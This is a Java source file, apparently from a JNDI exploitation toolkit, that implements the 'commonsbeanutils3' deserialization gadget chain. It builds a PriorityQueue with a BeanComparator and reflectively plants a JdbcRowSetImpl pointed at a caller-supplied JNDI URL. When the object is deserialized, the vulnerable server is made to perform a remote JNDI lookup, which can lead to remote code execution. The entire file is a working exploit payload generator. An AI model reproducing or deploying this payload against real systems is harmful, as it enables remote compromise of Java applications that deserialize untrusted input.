package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1"})
public class commonsbeanutils3 implements ObjectPayload<Object> {

    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        String jndiURL = null;
        if (param[0].toLowerCase().startsWith("jndi:")) {
            jndiURL = param[0].substring(5);
        }

        BeanComparator comparator = new BeanComparator("lowestSetBit");
        JdbcRowSetImpl rs         = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiURL);
        rs.setMatchColumn("QI4L");
        PriorityQueue queue = new PriorityQueue(2, comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(comparator, "property", "databaseMetaData");
        Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});
        return queue;
    }
}
